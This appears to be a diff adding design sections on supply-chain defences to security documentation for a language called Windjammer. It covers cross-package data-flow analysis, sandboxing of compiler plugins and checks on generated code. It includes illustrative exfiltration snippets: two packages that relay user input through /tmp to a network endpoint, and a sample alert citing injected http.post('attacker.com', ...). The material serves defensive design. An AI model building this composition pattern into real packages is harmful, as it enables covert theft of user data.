@@ -1221,6 +1221,256 @@ only_in = "debug"
 
 ---
 
+## Cross-Package Capability Composition Attacks
+
+### The Problem
+
+**Individual packages look innocent, but together enable attacks:**
+
+```windjammer
+// Package A: innocent-parser (writes to /tmp)
+pub fn parse_and_cache(text: str) -> Value {
+    let result = tokenize(text)
+    fs.write_file("/tmp/parsed-data.json", text)  // <fs_write:/tmp/*>
+    result
+}
+
+// Package B: innocent-sync-lib (reads from /tmp, sends to network)
+pub fn sync_cache() {
+    let data = fs.read_file("/tmp/parsed-data.json")  // <fs_read:/tmp/*>
+    http.post("https://api.example.com/cache", data)  // <net_egress>
+}
+```
+
+**Each package analyzed independently:**
+- Package A: `<fs_write:/tmp/*>` ✅ Allowed (caching is common)
+- Package B: `<fs_read:/tmp/*, net_egress>` ✅ Allowed (sync is common)
+
+**Combined effect:**
+- User input → Package A → /tmp → Package B → network
+- **Effective exfiltration using "innocent" packages!** 🚨
+
+### Solution: Cross-Package Data Flow Analysis
+
+**Analyze information flow ACROSS package boundaries:**
+
+```rust
+fn analyze_cross_package_flows(all_deps: &[Dependency]) -> Vec<SuspiciousFlow> {
+    let mut suspicious_flows = Vec::new();
+    
+    // Build global data flow graph
+    let flow_graph = build_cross_package_flow_graph(all_deps);
+    
+    // Find paths from sensitive sources to dangerous sinks
+    for source in sensitive_sources() {  // User input, credentials, etc.
+        for sink in dangerous_sinks() {  // Network, processes, etc.
+            for path in flow_graph.all_paths_between(source, sink) {
+                // Check if path crosses package boundaries
+                if path.crosses_packages() {
+                    suspicious_flows.push(SuspiciousFlow {
+                        source,
+                        sink,
+                        path,
+                        packages_involved: path.packages(),
+                        severity: assess_severity(source, sink),
+                    });
+                }
+            }
+        }
+    }
+    
+    suspicious_flows
+}
+```
+
+**Detection example:**
+```bash
+wj build
+
+Analyzing cross-package data flows...
+
+🚨 SUSPICIOUS CROSS-PACKAGE FLOW DETECTED
+
+Flow: UserInput → /tmp → Network
+
+Path:
+  1. your_app::handle_request(user_input)
+     └─> innocent-parser::parse_and_cache(user_input)
+         └─> fs.write("/tmp/parsed-data.json", user_input)
+  
+  2. your_app::background_sync()
+     └─> innocent-sync-lib::sync_cache()
+         └─> fs.read("/tmp/parsed-data.json")
+             └─> http.post("https://api.example.com/cache", ...)
+
+Packages involved:
+├─> innocent-parser (writes to /tmp)
+└─> innocent-sync-lib (reads /tmp, sends to network)
+
+Severity: HIGH
+Explanation: User input flows to network via /tmp filesystem.
+This enables data exfiltration using two "innocent" packages.
+
+Recommendation:
+1. Review if this data flow is legitimate
+2. If yes: Add cross-package flow to allowlist
+   wj allow-flow "user-input -> tmp -> network" --audit "Cache sync"
+3. If no: Remove background_sync() or change caching mechanism
+```
+
+**Allowlist for legitimate patterns:**
+```toml
+# wj.toml
+[security.cross_package_flows]
+# Explicitly allow legitimate multi-package patterns
+allowed = [
+    { source = "user_input", sink = "network", via = "/tmp", reason = "Cache synchronization" }
+]
+```
+
+---
+
+## Compiler Plugin Security
+
+### The Threat
+
+**If Windjammer supports compiler plugins/proc macros, they can inject arbitrary code:**
+
+```windjammer
+// User writes innocent code
+#[derive(Serialize)]
+pub struct User {
+    name: str
+}
+
+// Malicious macro injects exfiltration code
+// (bypasses source analysis because code generated at compile-time)
+```
+
+### Solution 1: Sandboxed Plugin Execution
+
+**Run plugins in capability-restricted sandbox:**
+
+```rust
+struct PluginSandbox {
+    allowed_operations: HashSet<PluginOperation>,
+}
+
+impl PluginSandbox {
+    fn execute_plugin(&self, plugin: &Plugin, input: TokenStream) -> Result<TokenStream> {
+        // Create isolated WASM runtime
+        let mut wasm_runtime = WasmRuntime::new();
+        
+        // Only allow specific operations
+        wasm_runtime.allow_operation(PluginOperation::ParseTokens);
+        wasm_runtime.allow_operation(PluginOperation::GenerateCode);
+        
+        // Deny dangerous operations
+        wasm_runtime.deny_operation(PluginOperation::FileSystem);
+        wasm_runtime.deny_operation(PluginOperation::Network);
+        wasm_runtime.deny_operation(PluginOperation::ProcessSpawn);
+        
+        // Execute plugin in sandbox
+        wasm_runtime.execute(plugin.code, input)
+    }
+}
+```
+
+**Plugin manifest:**
+```toml
+# my-macro/wj-plugin.toml
+[plugin]
+name = "derive-serialize"
+version = "1.0.0"
+
+[security]
+capabilities = ["parse_tokens", "generate_code"]  # Limited scope
+justification = "Generates Serialize trait implementations"
+```
+
+**Enforcement:**
+```
+If plugin attempts file I/O, network, or process spawning:
+  → Sandbox violation
+  → Plugin killed
+  → Build fails with security alert
+```
+
+### Solution 2: Generated Code Analysis
+
+**Analyze the code generated BY plugins:**
+
+```rust
+fn validate_plugin_output(original: TokenStream, generated: TokenStream) -> Result<()> {
+    // Analyze generated code for injected capabilities
+    let generated_caps = infer_capabilities(&generated);
+    
+    // Plugins should NOT inject I/O operations
+    if generated_caps.contains(&Capability::NetEgress) {
+        return Err(Error::PluginInjectedCapability {
+            plugin: plugin_name,
+            injected: Capability::NetEgress,
+            explanation: "Plugin injected network access (suspicious!)",
+        });
+    }
+    
+    Ok(())
+}
+```
+
+**Example detection:**
+```
+🚨 PLUGIN SECURITY VIOLATION
+
+Plugin: derive-serialize@1.0.0
+Violation: Injected 'net_egress' capability
+
+Original code: #[derive(Serialize)] struct User { ... }
+Generated code: Contains http.post("attacker.com", ...)
+
+Plugins should only generate data structures and traits,
+NOT inject I/O operations.
+
+This is HIGHLY SUSPICIOUS (likely malicious).
+
+❌ Build failed
+❌ Plugin blocked
+📣 Reporting to Windjammer Security Team
+```
+
+### Solution 3: Capability Inheritance for Generated Code
+
+**Generated code inherits caller's capability budget:**
+
+```windjammer
+// User code (has limited capabilities)
+#[derive(Serialize)]
+pub struct User {
+    name: str
+}
+
+// Generated code (can't exceed user's capabilities)
+impl Serialize for User {
+    fn serialize(self) -> str {
+        // Generated code runs with SAME capability restrictions
+        // If user's module has [logic_only], generated code can't use network
+        format!("{{\"name\": \"{}\"}}", self.name)
+    }
+}
+```
+
+**Enforcement:**
+```
+For each plugin-generated code block:
+  capability_budget = caller_module.capabilities
+  
+  IF generated_code.uses_capability(c) AND c ∉ capability_budget THEN
+    ERROR: "Generated code exceeds module's capability budget"
+  END IF
+```
+
+---
+
 ## Success Metrics
 
 ### Security Metrics
